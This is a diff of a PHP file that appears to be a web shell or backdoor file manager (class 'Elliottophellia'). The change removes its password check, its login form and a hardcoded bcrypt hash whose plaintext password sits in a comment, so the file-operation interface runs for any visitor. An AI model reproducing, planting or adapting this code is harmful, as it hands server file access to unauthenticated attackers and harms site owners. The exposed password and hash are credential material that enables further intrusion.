@@ -1,7 +1,5 @@
 <?php
-const VERSION = '2.0.0-light';
-
-const PASSWORD_HASH = '$2y$10$Wfr5765YY0KbQ0l5fP7EI.YZq8o3FDXSr9a8XqeYaw3A9Cg3aGy/S'; // honeycomebear
+const VERSION = '2.0.0-mocha';
 
 function hexToString(string $hex): string
 {
@@ -16,11 +14,6 @@ function stringToHex(string $string): string
 function safeFileWrite(string $filename, string $content): bool
 {
     return file_put_contents($filename, $content) !== false;
-}
-
-function verifyPassword(string $password): bool
-{
-    return password_verify($password, PASSWORD_HASH);
 }
 
 function formatFileSize($bytes): string
@@ -159,11 +152,6 @@ class Elliottophellia
 
     public function run(): void
     {
-        if (!$this->isAuthenticated()) {
-            $this->showLoginForm();
-            return;
-        }
-
         $this->showHeader();
 
         if (isset($this->get['t'])) {
@@ -212,41 +200,6 @@ class Elliottophellia
 
         $this->handleFileOperations();
         $this->showFooter();
-    }
-
-    private function isAuthenticated(): bool
-    {
-        if (isset($this->post['pass'])) {
-            if (verifyPassword($this->post['pass'])) {
-                $_SESSION['authenticated'] = true;
-            }
-        }
-
-        return $_SESSION['authenticated'] ?? false;
-    }
-
-    private function showLoginForm(): void
-    {
-        echo '<!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <meta name="robots" content="noindex, nofollow" />
-            <title>WELCOME!</title>
-            <link rel="stylesheet" href="https://rei.my.id/assets/css/ophellia/v'.VERSION.'.css">
-            <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
-        </head>
-        <body>
-            <div class="login-container">
-                <h1>WELCOME BACK!</h1>
-                <form action="" method="post">
-                    <input type="password" name="pass" placeholder="Password" required>
-                    <button type="submit">Login</button>
-                </form>
-            </div>
-        </body>
-        </html>';
     }
 
     private function showHeader(): void
